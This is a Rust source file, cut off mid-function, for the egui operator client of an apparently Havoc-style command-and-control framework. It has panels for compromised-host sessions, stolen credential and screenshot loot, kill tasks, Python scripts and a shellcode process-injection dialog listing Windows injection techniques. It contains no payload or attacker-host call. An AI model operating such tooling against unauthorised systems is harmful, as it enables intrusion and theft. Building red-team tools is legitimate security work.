mod local_config;
mod login;
mod python;
mod transport;

use base64::Engine;
use std::collections::BTreeMap;
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

use anyhow::{Result, anyhow};
use clap::Parser;
use eframe::egui::{
    self, Align, Align2, Color32, FontId, Key, Layout, Pos2, Rect, RichText, Sense, Stroke,
};
use local_config::LocalConfig;
use login::{LoginAction, LoginState, render_login_dialog};
use python::{
    PythonRuntime, ScriptDescriptor, ScriptLoadStatus, ScriptOutputEntry, ScriptOutputStream,
};
use red_cell_common::demon::DemonCommand;
use red_cell_common::operator::{
    AgentTaskInfo, EventCode, FlatInfo, Message, MessageHead, OperatorMessage,
};
use rfd::FileDialog;
use transport::{
    AgentConsoleEntry, AgentConsoleEntryKind, AgentFileBrowserState, AgentProcessListState,
    AppState, ClientTransport, ConnectionStatus, FileBrowserEntry, LootItem, LootKind,
    ProcessEntry, SharedAppState, TlsVerification,
};

const WINDOW_TITLE: &str = "Red Cell Client";
const DEFAULT_SERVER_URL: &str = "wss://127.0.0.1:40056/havoc/";
const INITIAL_WINDOW_SIZE: [f32; 2] = [1600.0, 900.0];
const MINIMUM_WINDOW_SIZE: [f32; 2] = [1280.0, 720.0];
const SESSION_GRAPH_HEIGHT: f32 = 280.0;
const SESSION_GRAPH_MIN_ZOOM: f32 = 0.35;
const SESSION_GRAPH_MAX_ZOOM: f32 = 2.5;
const SESSION_GRAPH_ROOT_ID: &str = "__teamserver__";

#[derive(Debug, Clone, Parser, PartialEq, Eq)]
#[command(name = "red-cell-client", about = "Red Cell operator client")]
struct Cli {
    /// Teamserver WebSocket URL.
    #[arg(long, default_value = DEFAULT_SERVER_URL)]
    server: String,
    /// Directory containing client-side Python scripts.
    #[arg(long)]
    scripts_dir: Option<PathBuf>,
    /// Path to a PEM-encoded CA certificate for teamserver verification.
    #[arg(long)]
    ca_cert: Option<PathBuf>,
    /// SHA-256 fingerprint (hex) of the pinned teamserver certificate.
    #[arg(long)]
    cert_fingerprint: Option<String>,
    /// Disable TLS certificate verification entirely. DANGEROUS: makes connections
    /// vulnerable to man-in-the-middle attacks. Prefer --ca-cert or --cert-fingerprint.
    #[arg(long, default_value_t = false)]
    accept_invalid_certs: bool,
}

/// Application lifecycle phase.
enum AppPhase {
    /// Showing the login dialog, no active transport.
    Login(LoginState),
    /// Transport is active and login message has been sent.
    Authenticating {
        app_state: SharedAppState,
        transport: ClientTransport,
        login_state: LoginState,
    },
    /// Authenticated and showing the main operator UI.
    Connected {
        app_state: SharedAppState,
        #[allow(dead_code)]
        transport: ClientTransport,
    },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum AgentSortColumn {
    Id,
    Hostname,
    Username,
    Domain,
    Ip,
    Pid,
    Process,
    Arch,
    Elevated,
    Os,
    SleepJitter,
    LastCheckin,
}

impl AgentSortColumn {
    const ALL: [(Self, &'static str); 12] = [
        (Self::Id, "ID"),
        (Self::Hostname, "Hostname"),
        (Self::Username, "Username"),
        (Self::Domain, "Domain"),
        (Self::Ip, "IP"),
        (Self::Pid, "PID"),
        (Self::Process, "Process"),
        (Self::Arch, "Arch"),
        (Self::Elevated, "Elevated"),
        (Self::Os, "OS"),
        (Self::SleepJitter, "Sleep/Jitter"),
        (Self::LastCheckin, "Last Checkin"),
    ];
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct NoteEditorState {
    agent_id: String,
    note: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum LootTypeFilter {
    #[default]
    All,
    Credentials,
    Files,
    Screenshots,
}

impl LootTypeFilter {
    const ALL: [(Self, &'static str); 4] = [
        (Self::All, "All"),
        (Self::Credentials, "Credentials"),
        (Self::Files, "Files"),
        (Self::Screenshots, "Screenshots"),
    ];
}

#[derive(Debug, Default)]
struct AgentConsoleState {
    input: String,
    history: Vec<String>,
    history_index: Option<usize>,
    completion_index: usize,
    completion_seed: Option<String>,
    status_message: Option<String>,
}

#[derive(Debug, Default)]
struct AgentFileBrowserUiState {
    selected_path: Option<String>,
    pending_dirs: BTreeSet<String>,
    status_message: Option<String>,
}

#[derive(Debug, Default)]
struct AgentProcessPanelState {
    filter: String,
    status_message: Option<String>,
}

#[derive(Debug, Default)]
struct ScriptManagerState {
    selected_script: Option<String>,
    status_message: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
struct SessionGraphState {
    pan: egui::Vec2,
    zoom: f32,
}

impl Default for SessionGraphState {
    fn default() -> Self {
        Self { pan: egui::Vec2::ZERO, zoom: 1.0 }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum InjectionTargetAction {
    #[default]
    Inject,
    Migrate,
}

impl InjectionTargetAction {
    fn label(self) -> &'static str {
        match self {
            Self::Inject => "Inject",
            Self::Migrate => "Migrate",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum InjectionTechnique {
    #[default]
    Default,
    CreateRemoteThread,
    NtCreateThreadEx,
    NtQueueApcThread,
}

impl InjectionTechnique {
    const ALL: [(Self, &'static str); 4] = [
        (Self::Default, "Default"),
        (Self::CreateRemoteThread, "CreateRemoteThread"),
        (Self::NtCreateThreadEx, "NtCreateThreadEx"),
        (Self::NtQueueApcThread, "NtQueueApcThread"),
    ];

    fn as_wire_value(self) -> &'static str {
        match self {
            Self::Default => "default",
            Self::CreateRemoteThread => "createremotethread",
            Self::NtCreateThreadEx => "ntcreatethreadex",
            Self::NtQueueApcThread => "ntqueueapcthread",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ProcessInjectionDialogState {
    agent_id: String,
    pid: u32,
    process_name: String,
    arch: String,
    action: InjectionTargetAction,
    technique: InjectionTechnique,
    shellcode_path: String,
    arguments: String,
    status_message: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum ConsoleLayoutMode {
    #[default]
    Tabs,
    Split,
}

impl ConsoleLayoutMode {
    const ALL: [(Self, &'static str); 2] = [(Self::Tabs, "Tabs"), (Self::Split, "Split")];
}

#[derive(Debug, Default)]
struct SessionPanelState {
    filter: String,
    sort_column: Option<AgentSortColumn>,
    descending: bool,
    open_consoles: Vec<String>,
    selected_console: Option<String>,
    console_layout: ConsoleLayoutMode,
    console_state: BTreeMap<String, AgentConsoleState>,
    file_browser_state: BTreeMap<String, AgentFileBrowserUiState>,
    process_state: BTreeMap<String, AgentProcessPanelState>,
    note_editor: Option<NoteEditorState>,
    process_injection: Option<ProcessInjectionDialogState>,
    script_manager: ScriptManagerState,
    graph_state: SessionGraphState,
    pending_messages: Vec<OperatorMessage>,
    status_message: Option<String>,
    loot_type_filter: LootTypeFilter,
    loot_agent_filter: String,
    loot_time_filter: String,
    loot_text_filter: String,
    loot_status_message: Option<String>,
    chat_input: String,
}

impl SessionPanelState {
    fn toggle_sort(&mut self, column: AgentSortColumn) {
        if self.sort_column == Some(column) {
            self.descending = !self.descending;
        } else {
            self.sort_column = Some(column);
            self.descending = false;
        }
    }

    fn ensure_console_open(&mut self, agent_id: &str) {
        if !self.open_consoles.iter().any(|open_id| open_id == agent_id) {
            self.open_consoles.push(agent_id.to_owned());
        }
        self.selected_console = Some(agent_id.to_owned());
    }

    fn ensure_selected_console(&mut self) {
        if self
            .selected_console
            .as_ref()
            .is_some_and(|selected| self.open_consoles.iter().any(|open_id| open_id == selected))
        {
            return;
        }

        self.selected_console = self.open_consoles.first().cloned();
    }

    fn close_console(&mut self, agent_id: &str) {
        self.open_consoles.retain(|open_id| open_id != agent_id);
        self.console_state.remove(agent_id);
        self.file_browser_state.remove(agent_id);
        if self.selected_console.as_deref() == Some(agent_id) {
            self.selected_console = self.open_consoles.first().cloned();
        }
    }

    fn console_state_mut(&mut self, agent_id: &str) -> &mut AgentConsoleState {
        self.console_state.entry(agent_id.to_owned()).or_default()
    }

    fn file_browser_state_mut(&mut self, agent_id: &str) -> &mut AgentFileBrowserUiState {
        self.file_browser_state.entry(agent_id.to_owned()).or_default()
    }

    fn process_state_mut(&mut self, agent_id: &str) -> &mut AgentProcessPanelState {
        self.process_state.entry(agent_id.to_owned()).or_default()
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum SessionAction {
    OpenConsole(String),
    RequestKill(String),
    EditNote { agent_id: String, current_note: String },
}

#[derive(Debug, Clone)]
enum ScriptManagerAction {
    Load(PathBuf),
    Reload(String),
    Unload(String),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SessionGraphNodeKind {
    Teamserver,
    Agent,
}

#[derive(Debug, Clone, PartialEq)]
struct SessionGraphNode {
    id: String,
    title: String,
    subtitle: String,
    status: String,
    position: Pos2,
    size: egui::Vec2,
    kind: SessionGraphNodeKind,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct SessionGraphEdge {
    from: String,
    to: String,
}

#[derive(Debug, Clone, PartialEq)]
struct SessionGraphLayout {
    nodes: Vec<SessionGraphNode>,
    edges: Vec<SessionGraphEdge>,
}

struct ClientApp {
    phase: AppPhase,
    local_config: LocalConfig,
    cli_server_url: String,
    scripts_dir: Option<PathBuf>,
    tls_verification: TlsVerification,
    session_panel: SessionPanelState,
    outgoing_tx: Option<tokio::sync::mpsc::UnboundedSender<OperatorMessage>>,
    python_runtime: Option<PythonRuntime>,
}

impl ClientApp {
    fn new(cli: Cli) -> Self {
        let local_config = LocalConfig::load();
        let login_state = LoginState::new(&cli.server, &local_config);
        let tls_verification = resolve_tls_verification(&cli, &local_config);

        Self {
            phase: AppPhase::Login(login_state),
            local_config,
            cli_server_url: cli.server,
            scripts_dir: cli.scripts_dir,
            tls_verification,
            session_panel: SessionPanelState {
                sort_column: Some(AgentSortColumn::LastCheckin),
                descending: true,
                ..SessionPanelState::default()
            },
            outgoing_tx: None,
            python_runtime: None,
        }
    }

    fn snapshot(app_state: &SharedAppState) -> AppState {
        match app_state.lock() {
            Ok(state) => state.clone(),
            Err(poisoned) => poisoned.into_inner().clone(),
        }
    }

    fn handle_login_submit(&mut self, ctx: &egui::Context) {
        let AppPhase::Login(login_state) = &mut self.phase else {
            return;
        };

        login_state.set_connecting();

        let server_url = login_state.server_url.trim().to_owned();
        let app_state = Arc::new(Mutex::new(AppState::new(server_url.clone())));
        let scripts_dir =
            self.scripts_dir.clone().or_else(|| self.local_config.resolved_scripts_dir());
        let python_runtime = scripts_dir.as_ref().and_then(|path| match PythonRuntime::initialize(
            app_state.clone(),
            path.clone(),
        ) {
            Ok(runtime) => Some(runtime),
            Err(error) => {
                tracing::warn!(error = %error, "failed to initialize client python runtime");
                None
            }
        });

        match ClientTransport::spawn(
            server_url.clone(),
            app_state.clone(),
            ctx.clone(),
            python_runtime.clone(),
            self.tls_verification.clone(),
        ) {
            Ok(transport) => {
                let login_message = login_state.build_login_message();
                if let Err(error) = transport.queue_message(login_message) {
                    login_state.set_error(format!("Failed to send login: {error}"));
                    return;
                }
                self.outgoing_tx = Some(transport.outgoing_sender());

                self.local_config.server_url = Some(server_url);
                self.local_config.username = Some(login_state.username.trim().to_owned());
                if self.local_config.scripts_dir.is_none() {
                    self.local_config.scripts_dir = scripts_dir.clone();
                }
                self.local_config.save();
                self.python_runtime = python_runtime;

                let login_state_clone = login_state.clone();
                self.phase = AppPhase::Authenticating {
                    app_state,
                    transport,
                    login_state: login_state_clone,
                };
            }
            Err(error) => {
                login_state.set_error(format!("Connection failed: {error}"));
            }
        }
    }

    fn check_auth_response(&mut self) {
        let (snapshot, error_message) = match &self.phase {
            AppPhase::Authenticating { app_state, .. } => {
                let snap = Self::snapshot(app_state);
                let error = match &snap.connection_status {
                    ConnectionStatus::Error(msg) => Some(msg.clone()),
                    _ => None,
                };
                (snap, error)
            }
            _ => return,
        };

        if snapshot.operator_info.is_some() {
            let placeholder =
                AppPhase::Login(LoginState::new(&self.cli_server_url, &self.local_config));
            let old_phase = std::mem::replace(&mut self.phase, placeholder);
            if let AppPhase::Authenticating { app_state, transport, .. } = old_phase {
                self.phase = AppPhase::Connected { app_state, transport };
            }
            return;
        }

        if let Some(error_msg) = error_message {
            let placeholder =
                AppPhase::Login(LoginState::new(&self.cli_server_url, &self.local_config));
            let old_phase = std::mem::replace(&mut self.phase, placeholder);
            if let AppPhase::Authenticating { mut login_state, .. } = old_phase {
                login_state.set_error(error_msg);
                self.outgoing_tx = None;
                self.phase = AppPhase::Login(login_state);
            }
        }
    }

    fn render_connection_bar(&self, ui: &mut egui::Ui, state: &AppState) {
        ui.horizontal_wrapped(|ui| {
            ui.heading(WINDOW_TITLE);
            ui.separator();
            ui.label("Teamserver");
            ui.monospace(&state.server_url);
            ui.separator();
            ui.colored_label(state.connection_status.color(), state.connection_status.label());

            if let Some(message) = state.connection_status.detail() {
                ui.separator();
                ui.colored_label(state.connection_status.color(), message);
            }
        });
    }

    fn render_operator_panel(&self, ui: &mut egui::Ui, state: &AppState) {
        ui.heading("Operator");
        ui.separator();

        if let Some(operator) = &state.operator_info {
            ui.label(format!("Username: {}", operator.username));
            ui.label(format!("Online: {}", yes_no(operator.online)));
            ui.label(format!("Role: {}", operator.role.as_deref().unwrap_or("unassigned")));
            ui.label(format!(
                "Last seen: {}",
                operator.last_seen.as_deref().unwrap_or("not available")
            ));
        } else {
            ui.label("No operator session is active.");
        }
    }

    fn render_agents_panel(&mut self, ui: &mut egui::Ui, state: &AppState) {
        ui.heading("Sessions");
        ui.separator();

        ui.horizontal(|ui| {
            ui.label("Filter");
            let response = ui.add(
                egui::TextEdit::singleline(&mut self.session_panel.filter)
                    .hint_text("Search ID, host, user, process, note"),
            );
            if response.changed() {
                ui.ctx().request_repaint();
            }
        });
        ui.add_space(6.0);

        if state.agents.is_empty() {
            ui.label("No agents are registered yet.");
            return;
        }

        let agents = self.filtered_and_sorted_agents(&state.agents);
        if agents.is_empty() {
            ui.label("No agents match the current filter.");
            return;
        }

        if let Some(message) = &self.session_panel.status_message {
            ui.label(RichText::new(message).weak());
            ui.add_space(6.0);
        }

        self.render_session_table_header(ui);
        egui::ScrollArea::vertical().show(ui, |ui| {
            for agent in &agents {
                let fill = if agent.elevated {
                    Color32::from_rgba_unmultiplied(120, 28, 28, 110)
                } else {
                    Color32::from_rgba_unmultiplied(255, 255, 255, 8)
                };
                let frame = egui::Frame::default()
                    .fill(fill)
                    .stroke(Stroke::new(1.0, Color32::from_rgba_unmultiplied(255, 255, 255, 18)))
                    .inner_margin(egui::Margin::symmetric(8, 6));
                let inner = frame.show(ui, |ui| {
                    ui.horizontal(|ui| {
                        self.render_session_row_cell(ui, 86.0, &agent.name_id, true);
                        self.render_session_row_cell(ui, 116.0, &agent.hostname, false);
                        self.render_session_row_cell(ui, 108.0, &agent.username, false);
                        self.render_session_row_cell(ui, 86.0, &agent.domain_name, false);
                        self.render_session_row_cell(ui, 108.0, &agent_ip(agent), false);
                        self.render_session_row_cell(ui, 72.0, &agent.process_pid, false);
                        self.render_session_row_cell(ui, 132.0, &agent.process_name, false);
                        self.render_session_row_cell(ui, 72.0, &agent_arch(agent), false);
                        self.render_session_row_cell(
                            ui,
                            82.0,
                            if agent.elevated { "Yes" } else { "No" },
                            false,
                        );
                        self.render_session_row_cell(ui, 170.0, &agent_os(agent), false);
                        self.render_session_row_cell(ui, 110.0, &agent_sleep_jitter(agent), false);
                        self.render_session_row_cell(ui, 136.0, &agent.last_call_in, false);
                    });
                });

                let row_response = ui.interact(
                    inner.response.rect,
                    ui.make_persistent_id(("agent-row", &agent.name_id)),
                    Sense::click(),
                );

                if row_response.double_clicked() {
                    self.session_panel.ensure_console_open(&agent.name_id);
                }

                row_response.context_menu(|ui| {
                    if ui.button("Interact").clicked() {
                        self.handle_session_action(
                            SessionAction::OpenConsole(agent.name_id.clone()),
                            state.operator_info.as_ref().map(|operator| operator.username.as_str()),
                        );
                        ui.close();
                    }
                    if ui.button("Kill").clicked() {
                        self.handle_session_action(
                            SessionAction::RequestKill(agent.name_id.clone()),
                            state.operator_info.as_ref().map(|operator| operator.username.as_str()),
                        );
                        ui.close();
                    }
                    if ui.button("Add note").clicked() {
                        self.handle_session_action(
                            SessionAction::EditNote {
                                agent_id: agent.name_id.clone(),
                                current_note: agent.note.clone(),
                            },
                            state.operator_info.as_ref().map(|operator| operator.username.as_str()),
                        );
                        ui.close();
                    }
                });

                ui.add_space(4.0);
            }
        });
    }

    fn render_listeners_panel(&self, ui: &mut egui::Ui, state: &AppState) {
        ui.heading("Listeners");
        ui.separator();

        if state.listeners.is_empty() {
            ui.label("No listeners are configured yet.");
            return;
        }

        egui::ScrollArea::vertical().show(ui, |ui| {
            for listener in &state.listeners {
                ui.group(|ui| {
                    ui.label(RichText::new(&listener.name).strong());
                    ui.label(format!("Protocol: {}", listener.protocol));
                    ui.label(format!("Status: {}", listener.status));
                });
            }
        });
    }

    fn render_loot_panel(&mut self, ui: &mut egui::Ui, state: &AppState) {
        ui.heading("Loot");
        ui.separator();

        ui.horizontal_wrapped(|ui| {
            ui.label("Type");
            egui::ComboBox::from_id_salt("loot-type-filter")
                .selected_text(match self.session_panel.loot_type_filter {
                    LootTypeFilter::All => "All",
                    LootTypeFilter::Credentials => "Credentials",
                    LootTypeFilter::Files => "Files",
                    LootTypeFilter::Screenshots => "Screenshots",
                })
                .show_ui(ui, |ui| {
                    for (value, label) in LootTypeFilter::ALL {
                        ui.selectable_value(&mut self.session_panel.loot_type_filter, value, label);
                    }
                });
            ui.label("Agent");
            ui.add(
                egui::TextEdit::singleline(&mut self.session_panel.loot_agent_filter)
                    .desired_width(84.0)
                    .hint_text("ABCD1234"),
            );
            ui.label("Time");
            ui.add(
                egui::TextEdit::singleline(&mut self.session_panel.loot_time_filter)
                    .desired_width(100.0)
                    .hint_text("2026-03-10"),
            );
        });
        ui.add(
            egui::TextEdit::singleline(&mut self.session_panel.loot_text_filter)
                .hint_text("Search name, path, source, preview"),
        );
        if let Some(message) = &self.session_panel.loot_status_message {
            ui.add_space(6.0);
            ui.label(RichText::new(message).weak());
        }
        ui.add_space(6.0);

        let filtered_loot: Vec<_> = state
            .loot
            .iter()
            .filter(|item| {
                loot_matches_filters(
                    item,
                    self.session_panel.loot_type_filter,
                    &self.session_panel.loot_agent_filter,
                    &self.session_panel.loot_time_filter,
                    &self.session_panel.loot_text_filter,
                )
            })
            .collect();

        if filtered_loot.is_empty() {
            ui.label(if state.loot.is_empty() {
                "No loot has been collected yet."
            } else {
                "No loot matches the current filters."
            });
            return;
        }

        egui::ScrollArea::vertical().show(ui, |ui| {
            for item in filtered_loot {
                ui.group(|ui| {
                    ui.horizontal_wrapped(|ui| {
                        ui.label(RichText::new(item.kind.label()).strong());
                        ui.separator();
                        ui.label(RichText::new(&item.name).strong());
                        if !item.agent_id.is_empty() {
                            ui.separator();
                            ui.monospace(&item.agent_id);
                        }
                    });
                    ui.label(format!("Source: {}", item.source));
                    ui.label(format!(
                        "Collected: {}",
                        blank_if_empty(&item.collected_at, "unknown")
                    ));
                    if let Some(path) = &item.file_path {
                        ui.label(format!("Path: {path}"));
                    }
                    if let Some(size) = item.size_bytes {
                        ui.label(format!("Size: {}", human_size(size)));
                    }
                    if let Some(preview) = &item.preview {
                        ui.add_space(4.0);
                        ui.label(RichText::new(preview).monospace());
                    }
                    if loot_is_downloadable(item) {
                        ui.add_space(6.0);
                        if ui.button("Download").clicked() {
                            self.session_panel.loot_status_message =
                                Some(download_loot_item(item).unwrap_or_else(|error| error));
                        }
                    }
                });
                ui.add_space(6.0);
            }
        });
    }

    fn render_chat_panel(&mut self, ui: &mut egui::Ui, state: &AppState) {
        ui.heading("Team Chat");
        ui.separator();

        let online_users = if state.online_operators.is_empty() {
            "No presence data".to_owned()
        } else {
            state.online_operators.iter().cloned().collect::<Vec<_>>().join(", ")
        };
        ui.label(format!("Online: {online_users}"));
        ui.add_space(6.0);

        ui.horizontal(|ui| {
            let input = ui.add(
                egui::TextEdit::singleline(&mut self.session_panel.chat_input)
                    .desired_width(f32::INFINITY)
                    .hint_text("Send a message to all operators"),
            );
            let send_requested =
                input.lost_focus() && ui.input(|state| state.key_pressed(egui::Key::Enter));
            if ui.button("Send").clicked() || send_requested {
                if let Some(message) = build_chat_message(
                    state.operator_info.as_ref().map(|operator| operator.username.as_str()),
                    &self.session_panel.chat_input,
                ) {
                    self.session_panel.pending_messages.push(message);
                    self.session_panel.chat_input.clear();
                }
            }
        });
        ui.add_space(8.0);

        if state.chat_messages.is_empty() {
            ui.label("No chat messages yet.");
        } else {
            egui::ScrollArea::vertical().stick_to_bottom(true).show(ui, |ui| {
                for message in &state.chat_messages {
                    ui.group(|ui| {
                        ui.horizontal(|ui| {
                            ui.strong(&message.author);
                            ui.label(RichText::new(&message.sent_at).weak());
                        });
                        ui.label(&message.message);
                    });
                }
            });
        }
    }

    fn render_overview_panel(&self, ui: &mut egui::Ui, state: &AppState) {
        ui.heading("Overview");
        ui.separator();
        ui.label("Connected to teamserver. Live WebSocket transport is active.");
        ui.add_space(8.0);

        egui::Grid::new("overview-stats").num_columns(2).spacing([16.0, 8.0]).show(ui, |ui| {
            ui.label("Connection");
            ui.colored_label(state.connection_status.color(), state.connection_status.label());
            ui.end_row();

            ui.label("Operator");
            ui.label(
                state.operator_info.as_ref().map_or("Not authenticated", |op| op.username.as_str()),
            );
            ui.end_row();

            ui.label("Agents");
            ui.label(state.agents.len().to_string());
            ui.end_row();

            ui.label("Listeners");
            ui.label(state.listeners.len().to_string());
            ui.end_row();

            ui.label("Loot items");
            ui.label(state.loot.len().to_string());
            ui.end_row();

            ui.label("Chat messages");
            ui.label(state.chat_messages.len().to_string());
            ui.end_row();
        });

        ui.add_space(12.0);
        ui.label(RichText::new("Connection states").strong());
        ui.horizontal_wrapped(|ui| {
            for status in ConnectionStatus::placeholders() {
                ui.colored_label(status.color(), status.label());
            }
        });
    }

    fn render_current_phase(
        &mut self,
        ctx: &egui::Context,
        fallback_app_state: Option<SharedAppState>,
    ) {
        match &mut self.phase {
            AppPhase::Login(login_state) => {
                let action = render_login_dialog(ctx, login_state);
                if action == LoginAction::Submit {
                    self.handle_login_submit(ctx);
                }
            }
            AppPhase::Authenticating { .. } => {
                if let Some(app_state_ref) = fallback_app_state {
                    let snapshot = Self::snapshot(&app_state_ref);
                    egui::CentralPanel::default().show(ctx, |ui| {
                        ui.with_layout(Layout::top_down(Align::Center), |ui| {
                            ui.add_space(ui.available_height() * 0.35);
                            ui.heading("Authenticating...");
                            ui.add_space(8.0);
                            ui.colored_label(
                                snapshot.connection_status.color(),
                                snapshot.connection_status.label(),
                            );
                        });
                    });
                }
            }
            AppPhase::Connected { app_state, .. } => {
                let app_state_ref = app_state.clone();
                self.render_main_ui(ctx, &app_state_ref);
            }
        }
    }

    fn render_main_ui(&mut self, ctx: &egui::Context, app_state: &SharedAppState) {
        let snapshot = Self::snapshot(app_state);

        egui::TopBottomPanel::top("connection_bar").show(ctx, |ui| {
            self.render_connection_bar(ui, &snapshot);
        });

        egui::SidePanel::left("navigation_left").resizable(true).default_width(320.0).show(
            ctx,
            |ui| {
                self.render_operator_panel(ui, &snapshot);
                ui.add_space(12.0);
                self.render_agents_panel(ui, &snapshot);
            },
        );

        egui::SidePanel::right("navigation_right").resizable(true).default_width(320.0).show(
            ctx,
            |ui| {
                self.render_listeners_panel(ui, &snapshot);
                ui.add_space(12.0);
                self.render_loot_panel(ui, &snapshot);
            },
        );

        egui::TopBottomPanel::bottom("chat_panel").resizable(true).default_height(220.0).show(
            ctx,
            |ui| {
                self.render_chat_panel(ui, &snapshot);
            },
        );

        egui::CentralPanel::default().show(ctx, |ui| {
            ui.with_layout(Layout::top_down(Align::Min), |ui| {
                self.render_console_workspace(ui, &snapshot);
            });
        });

        self.render_note_editor(ctx, app_state);
        self.render_process_injection_dialog(ctx);
        self.flush_pending_messages();
    }

    fn render_session_table_header(&mut self, ui: &mut egui::Ui) {
        let widths = [
            (AgentSortColumn::Id, 86.0),
            (AgentSortColumn::Hostname, 116.0),
            (AgentSortColumn::Username, 108.0),
            (AgentSortColumn::Domain, 86.0),
            (AgentSortColumn::Ip, 108.0),
            (AgentSortColumn::Pid, 72.0),
            (AgentSortColumn::Process, 132.0),
            (AgentSortColumn::Arch, 72.0),
            (AgentSortColumn::Elevated, 82.0),
            (AgentSortColumn::Os, 170.0),
            (AgentSortColumn::SleepJitter, 110.0),
            (AgentSortColumn::LastCheckin, 136.0),
        ];
        ui.horizontal(|ui| {
            for (column, width) in widths {
                let label = sort_button_label(
                    self.session_panel.sort_column,
                    self.session_panel.descending,
                    column,
                );
                let button =
                    egui::Button::new(label).frame(false).wrap_mode(egui::TextWrapMode::Truncate);
                if ui.add_sized([width, 24.0], button).clicked() {
                    self.session_panel.toggle_sort(column);
                }
            }
        });
        ui.separator();
    }

    fn render_session_row_cell(&self, ui: &mut egui::Ui, width: f32, value: &str, monospace: bool) {
        let text = ellipsize(value, 24);
        if monospace {
            ui.add_sized([width, 20.0], egui::Label::new(RichText::new(text).monospace()));
        } else {
            ui.add_sized([width, 20.0], egui::Label::new(text));
        }
    }

    fn filtered_and_sorted_agents(
        &self,
        agents: &[transport::AgentSummary],
    ) -> Vec<transport::AgentSummary> {
        let mut filtered: Vec<_> = agents
            .iter()
            .filter(|agent| agent_matches_filter(agent, &self.session_panel.filter))
            .cloned()
            .collect();
        sort_agents(
            &mut filtered,
            self.session_panel.sort_column.unwrap_or(AgentSortColumn::LastCheckin),
            self.session_panel.descending,
        );
        filtered
    }

    fn handle_session_action(&mut self, action: SessionAction, operator: Option<&str>) {
        match action {
            SessionAction::OpenConsole(agent_id) => {
                self.session_panel.ensure_console_open(&agent_id);
            }
            SessionAction::RequestKill(agent_id) => {
                self.session_panel
                    .pending_messages
                    .push(build_kill_task(&agent_id, operator.unwrap_or("")));
                self.session_panel.status_message =
                    Some(format!("Queued kill task for {agent_id}."));
            }
            SessionAction::EditNote { agent_id, current_note } => {
                self.session_panel.note_editor =
                    Some(NoteEditorState { agent_id, note: current_note });
            }
        }
    }

    fn render_console_workspace(&mut self, ui: &mut egui::Ui, state: &AppState) {
        self.session_panel.ensure_selected_console();
        self.render_session_graph_panel(ui, state);
        ui.add_space(12.0);
        self.render_script_manager_panel(ui);
        ui.add_space(12.0);

        if self.session_panel.open_consoles.is_empty() {
            self.render_overview_panel(ui, state);
            return;
        }

        ui.heading("Command Console");
        ui.separator();

        ui.horizontal_wrapped(|ui| {
            ui.label("View");
            egui::ComboBox::from_id_salt("console-layout-mode")
                .selected_text(match self.session_panel.console_layout {
                    ConsoleLayoutMode::Tabs => "Tabs",
                    ConsoleLayoutMode::Split => "Split",
                })
                .show_ui(ui, |ui| {
                    for (value, label) in ConsoleLayoutMode::ALL {
                        ui.selectable_value(&mut self.session_panel.console_layout, value, label);
                    }
                });
        });
        ui.add_space(8.0);

        self.render_console_tabs(ui);
        ui.add_space(8.0);

        match self.session_panel.console_layout {
            ConsoleLayoutMode::Tabs => {
                if let Some(agent_id) = self.session_panel.selected_console.clone() {
                    self.render_single_console(ui, state, &agent_id);
                }
            }
            ConsoleLayoutMode::Split => {
                let visible = split_console_selection(
                    &self.session_panel.open_consoles,
                    self.session_panel.selected_console.as_deref(),
                )
                .into_iter()
                .map(ToOwned::to_owned)
                .collect::<Vec<_>>();
                if visible.len() == 1 {
                    self.render_single_console(ui, state, &visible[0]);
                } else {
                    ui.columns(2, |columns| {
                        for (column, agent_id) in columns.iter_mut().zip(visible.into_iter()) {
                            self.render_single_console(column, state, &agent_id);
                        }
                    });
                }
            }
        }
    }

    fn render_script_manager_panel(&mut self, ui: &mut egui::Ui) {
        ui.heading("Python Scripts");
        ui.separator();

        let Some(runtime) = self.python_runtime.clone() else {
            ui.label("Client Python runtime is not initialized.");
            return;
        };

        let scripts = runtime.script_descriptors();
        let output = runtime.script_output();
        self.prune_selected_script(&scripts);

        let loaded_count =
            scripts.iter().filter(|script| script.status == ScriptLoadStatus::Loaded).count();
        let error_count =
            scripts.iter().filter(|script| script.status == ScriptLoadStatus::Error).count();
        let command_count =
            scripts.iter().map(|script| script.registered_command_count).sum::<usize>();

        ui.horizontal_wrapped(|ui| {
            ui.label(format!("Loaded: {loaded_count}"));
            ui.separator();
            ui.label(format!("Errors: {error_count}"));
            ui.separator();
            ui.label(format!("Commands: {command_count}"));
            if let Some(path) =
                self.scripts_dir.clone().or_else(|| self.local_config.resolved_scripts_dir())
            {
                ui.separator();
                ui.monospace(path.display().to_string());
            }
        });
        ui.add_space(6.0);

        ui.horizontal_wrapped(|ui| {
            if ui.button("Load Script").clicked()
                && let Some(path) = FileDialog::new().add_filter("Python", &["py"]).pick_file()
            {
                match runtime.load_script(path.clone()) {
                    Ok(()) => {
                        if let Some(script_name) = script_name_for_display(&path) {
                            self.session_panel.script_manager.selected_script = Some(script_name);
                        }
                        self.session_panel.script_manager.status_message =
                            Some(format!("Loaded {}.", path.display()));
                    }
                    Err(error) => {
                        self.session_panel.script_manager.status_message =
                            Some(format!("Failed to load {}: {error}", path.display()));
                    }
                }
            }

            let selected_script = self.session_panel.script_manager.selected_script.clone();
            if ui
                .add_enabled(selected_script.is_some(), egui::Button::new("Reload Selected"))
                .clicked()
                && let Some(script_name) = selected_script.as_deref()
            {
                self.apply_script_action(
                    &runtime,
                    ScriptManagerAction::Reload(script_name.to_owned()),
                );
            }

            if ui
                .add_enabled(selected_script.is_some(), egui::Button::new("Unload Selected"))
                .clicked()
                && let Some(script_name) = selected_script.as_deref()
            {
                self.apply_script_action(
                    &runtime,
                    ScriptManagerAction::Unload(script_name.to_owned()),
                );
            }
        });

        if let Some(message) = &self.session_panel.script_manager.status_message {
            ui.add_space(4.0);
            ui.label(RichText::new(message).weak());
        }

        ui.add_space(8.0);
        ui.columns(2, |columns| {
